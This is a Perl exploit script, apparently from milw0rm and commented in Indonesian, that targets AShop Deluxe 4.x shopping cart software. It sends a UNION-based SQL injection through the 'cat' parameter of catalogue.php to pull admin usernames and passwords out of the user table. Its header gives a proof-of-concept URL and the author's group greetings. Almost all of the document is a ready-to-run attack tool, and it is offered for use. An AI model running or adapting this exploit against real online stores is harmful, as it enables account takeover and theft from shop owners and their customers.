#usr/bin/perl
use LWP::UserAgent;
use HTTP::Cookies;
use Getopt::Long;
use URI::Escape;
#--------------------------------------------------------------------------------------------------------------------------------------------------------
# [x] AShop Deluxe 4.x Remote SQL inJection Exploit
# [x] Ditemukan Oleh		: n0c0py - a.k.a 5iR. 4b03D
# [x] Pada Tanggal		: 27 juni 2008
# [x] Vendor			: http://www.ashopsoftware.com
# [x] Laporkan pada vendor	: 28 Juni 2008 - PatCh ada pada veNdoR
# [x] Dork                  	: -
# [x] Deskripsi			: AShop Deluxe shopping cart software automates the processing of
#				  online orders and payments. It is a shopping cart plus an array of
#				  specialized tools to support various types of products and selling styles. 
#				  The system automates redundant tasks, organizes data, and simplifies 
#				  the daily operations of an online store. 
#--------------------------------------------------------------------------------------------------------------------------------------------------------
#
# ===============================================================================================================#
# Konsep =>
# => http://victim.com/ashop/catalogue.php?cat=-99/**/union/**/select/**/1,0x76756C6E657261626C65/*
# => Versi dibawahnya juga memungkinkan memiliki kutu yang sama
# => password tidak ter-encode membuat eksploitasi semakin mudah
# [Catatan]
# n0c0py tidak bertanggung jawab atas penyalahgunaan exploit ini. Greetz:
# { k1tk4t, Autonux, keboaja, k0il, G1 }
# yogyafree => yadoy666, Xshadow, Jack, odod, ray16, indounderground, shadow angel dan segenap Tim
# newhack => fl3xu5, opt1|c, L4in
# masyarakat hacking indonesia [ yogyafree.net | newhack.org | mainhack.com | echo.or.id | kecoak-elektronik.net ]
# ================================================================================================================#
 if (@ARGV < 1){
   
   print"\nAshop Deluxe 4.x (catalogue.php)";
   print"\nRemote SQL Injection Exploit       ";
   print"\ncoded by n0c0py                   ";
   print"\n";
   print"\n[!] Penggunaan : perl $0 [Host] [Path] <Options>";
   print"\n[!] Contoh     : perl $0 127.0.0.1 /ashop       ";
   print"\n[!] Pilihan    :";
   print"\n                -p [ip:port]  Proxy support     ";
   print"\n";
exit;
}

print "[+] melakukan eksploitasi...\n";

eksploitasi();

print "\n[+] Bravo!! :D";
print "\n[+] Eksploitasi Selesai Boss!! :D\n";

sub eksploitasi

{
  my $host    	= $ARGV[0];
  my $path    	= $ARGV[1];
  my %options = ();
  GetOptions(\%options, "p=s");
  my $url = "http://".$host.$path."/catalogue.php";
  my $sploit = "?cat=-99/**/union/**/select/**/1,concat(0x3a3a3a,username,0x3a3a,password,0x3a3a3a)/**/from/**/user/*";
  my $exploit= $url.$sploit;
  my $ua = LWP::UserAgent->new();
  my $res = "";
  my $content="";
  my $regex = "";
  if($options{"p"})
  {
    $ua->proxy('http', "http://".$options{"p"});
  }
#[------------------------------]
#   Apakah file eksis?
#[------------------------------]
$res = $ua->get($url);
  if(!$res->is_success)
  {
    print("[+] Gagal! file tidak ditemukan!\n");
    print $res->status_line();
  }
#[-------------------------]
#      Eksploitasi
#[-------------------------]
  $res = $ua->get($exploit);
  $content = $res->content;
if ($content =~ /:::(.+):::/)
{
$regex=$1;
($pengguna,$password)= split('::',$regex);
printf " [x]nama admin = $pengguna \n [x]password admin = $password\n";
}
else { die "Gagal mengeksploitasi :p \n";
}

}

# milw0rm.com [2008-06-30]
